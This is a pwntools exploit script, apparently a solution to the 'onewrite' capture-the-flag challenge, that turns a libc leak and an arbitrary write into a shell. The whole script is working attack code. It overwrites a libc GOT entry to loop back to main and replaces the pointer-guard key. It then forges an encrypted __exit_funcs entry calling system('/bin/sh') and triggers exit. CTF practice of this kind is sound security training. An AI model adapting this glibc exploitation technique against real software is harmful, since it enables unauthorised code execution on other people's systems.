from pwn import *
import sys

#Cre: vilex1337

_path = "./vuln_patched"
exe = ELF(_path)
libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'onewrite.chal.imaginaryctf.org'
port = 1337
cmd = '''
    b *main + 158
    continue
    continue
    continue
    continue
'''

_option = {'run' : process(_path), 
           'exp' : remote(add, port)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

chall = conn()

def check():
    chall.interactive()
    exit()

def main():
    #This challenge give us a libc pointer to printf functions and 1 time write to anywhere.
    #My idea is that overwrite libc got to control program flow.
    libc.address = 0
    chall.recvuntil(b'\n')
    libc.address = int(chall.recvuntil(b'\n')[:-1], 16) - libc.sym['printf']

    #Make program write more than 1 time
    _write = libc.address + 0x219098 #strlen libc got
    print(hex(libc.address))
    print(hex(_write))
    chall.sendlineafter(b'> ', hex(_write)[2:].encode())
    sleep(1)
    _write = libc.address + 0xc6115 # gadget call main again so we can write anytime program call puts
    print(hex(_write))
    chall.sendline(p(_write))
    
    #Overwrite the key for exitfuncs
    key = 0x1337133713371337
    _write = libc.address - 0x28a0
    chall.sendlineafter(b'> ', hex(_write)[2:].encode())
    sleep(1)
    chall.sendline(p(key) * 50)
    
    #Overwrite __exit_funcs handler
    onexit_fun = p(0) + p(1) + p(4) + encrypt(libc.sym['system'], key) + p(next(libc.search(b"/bin/sh"))) + p(0)
    _write = libc.address + 0x21af00
    chall.sendlineafter(b'> ', hex(_write)[2:].encode())
    sleep(1)
    chall.sendline(onexit_fun)

    #Call exit
    _write = libc.address + 0x219098 #strlen libc got
    chall.sendlineafter(b'> ', hex(_write)[2:].encode())
    _write = libc.address + 0x455f6 #exit
    sleep(1)
    chall.sendline(p(_write))

    chall.interactive()


if __name__ == "__main__":
    main()
